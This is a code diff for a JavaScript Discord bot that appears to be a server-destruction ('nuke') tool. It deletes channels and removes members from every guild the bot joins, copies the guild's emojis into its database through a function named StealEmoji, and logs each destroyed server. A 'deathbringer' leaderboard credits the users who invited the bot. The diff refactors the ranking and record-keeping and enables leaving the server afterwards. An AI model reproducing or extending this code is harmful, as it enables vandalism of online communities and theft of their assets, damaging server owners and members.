@@ -11,8 +11,9 @@ let emojiCounter = 0;
 let textChannelCounter = 0;
 let voiceChannelCounter = 0;
 let killCounter = 0;
+let serverId = 0;
 
-const StealEmoji = async (g, serverId) => {
+const StealEmoji = async (g) => {
   let emojis = [];
 
   await g.emojis.fetch().then((emo) =>
@@ -21,14 +22,17 @@ const StealEmoji = async (g, serverId) => {
       emojis.push({
         name: e.name,
         url: e.url,
-        serverId: serverId,
       });
     })
   );
 
   return emojis.map((e) =>
     prisma.emojis.create({
-      data: { name: e.name, url: e.url, serverId: e.serverId },
+      data: {
+        name: e.name,
+        url: e.url,
+        serverId: serverId,
+      },
     })
   );
 };
@@ -50,18 +54,18 @@ const PurgeMembers = async (g) => {
     );
 };
 
-const Logging = () => {
-  let logMsg = `
-    [${new Date().toISOString()}] 
-    [INFO] Death has arrived to: ${g.name} 
-    Deaths: ${killCounter}, 
-    Text Channels: ${textChannelCounter}, 
-    Voice Channels: ${voiceChannelCounter}, 
-    Total: ${textChannelCounter + voiceChannelCounter} \n`;
+const Logging = (g) => {
+  let log = `[${new Date().toISOString()}] [INFO] Death has arrived to: ${
+    g.name
+  } Deaths: ${killCounter}, Text Channels: ${textChannelCounter},  Voice Channels: ${voiceChannelCounter}, Total: ${
+    textChannelCounter + voiceChannelCounter
+  } \n`;
 
-  fs.appendFile(`${LOG_PATH}/log.txt`, logMsg, (err) => {
+  fs.appendFile(`${LOG_PATH}/log.txt`, log, (err) => {
     if (err) throw err;
   });
+
+  console.log(log);
 };
 
 const UpdateStats = () => {
@@ -89,61 +93,64 @@ const UpdateUserRanking = async (client, g) => {
   let intergations = await g.fetchIntegrations();
   for (const [key, int] of intergations.entries()) {
     if (int.application.id == BOT_ID) {
-      let deathbringer = client.users.cache.find(
+      let serchedUser = client.users.cache.find(
         (user) => user.id === int.user.id
       );
-      return [
-        deathbringer.id,
-        prisma.deathbringer.upsert({
-          where: {
-            id: parseInt(int.user.id),
-          },
-          update: {
-            killedServersCount: { increment: 1 },
-            removedTextChannels: { increment: textChannelCounter },
-            removedVoiceChannels: { increment: voiceChannelCounter },
-          },
-          create: {
-            username: deathbringer.username,
-            userId: deathbringer.id,
-            killedServersCount: 1,
-            removedTextChannels: textChannelCounter,
-            removedVoiceChannels: voiceChannelCounter,
-          },
-        }),
-      ];
+
+      let deathbringer = await prisma.deathbringer.upsert({
+        where: {
+          userId: int.user.id,
+        },
+        update: {
+          killedServersCount: { increment: 1 },
+          removedTextChannels: { increment: textChannelCounter },
+          removedVoiceChannels: { increment: voiceChannelCounter },
+        },
+        create: {
+          username: serchedUser.username,
+          userId: serchedUser.id,
+          killedServersCount: 1,
+          removedTextChannels: textChannelCounter,
+          removedVoiceChannels: voiceChannelCounter,
+        },
+      });
+
+      let server = await prisma.purgedServer.create({
+        data: {
+          name: g.name,
+          ownerId: g.ownerId,
+          memberCount: g.memberCount,
+          memberRemoved: killCounter,
+          premiumTier: g.premiumTier,
+          emojiCount: emojiCounter,
+          killerId: deathbringer.id,
+        },
+      });
+
+      serverId = server.id;
     }
   }
 };
 
 export const Purge = (client) => {
   client.guilds.cache.map(async (g) => {
-    let [killerId, deathbringerUpdate] = await UpdateUserRanking(client, g);
-
-    const serverInsert = await prisma.purgedServer.create({
-      data: {
-        name: g.name,
-        serverId: g.id,
-        ownerId: g.ownerId,
-        memberCount: g.memberCount,
-        premiumTier: g.premiumTier,
-        emojiCount: emojiCounter,
-        killerId: parseInt(killerId) || 0,
-      },
-    });
+    emojiCounter = 0;
+    textChannelCounter = 0;
+    voiceChannelCounter = 0;
+    killCounter = 0;
+    serverId = 0;
 
     await PurgeChannels(g);
     await PurgeMembers(g);
-    let emojiBatchInsert = await StealEmoji(g, serverInsert.serverId);
+    await UpdateUserRanking(client, g);
+
+    let emojiBatchInsert = await StealEmoji(g);
     let statUpdate = UpdateStats(g);
 
-    await prisma.$transaction([
-      ...emojiBatchInsert,
-      statUpdate,
-      deathbringerUpdate,
-    ]);
+    await prisma.$transaction([...emojiBatchInsert, statUpdate]);
 
-    Logging();
-    //g.leave();
+    Logging(g);
+
+    g.leave();
   });
 };
